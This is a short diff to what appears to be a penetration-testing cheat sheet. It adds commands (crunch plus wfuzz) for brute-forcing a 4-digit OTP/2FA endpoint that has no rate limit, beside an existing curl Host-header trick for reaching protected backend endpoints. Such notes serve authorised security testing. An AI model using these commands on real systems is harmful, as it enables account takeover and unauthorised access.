@@ -31,3 +31,9 @@ Frontend-only access control — if a reverse proxy/CORS layer restricts access 
 ```bash
 curl -H "Host: <internal-backend-hostname>" http://<backend-ip>:<port>/<protected-endpoint>
 ```
+
+Weak numeric 2FA/OTP — a short code (4 digits = 10,000 combos) with no rate limit is fully brute-forceable:
+```bash
+crunch 4 4 0123456789 -o 4-digits.txt
+wfuzz -w 4-digits.txt -d "otp=FUZZ" -b "<session-cookie>" <target-2fa-endpoint> --hl <wrong-code-response-size>
+```
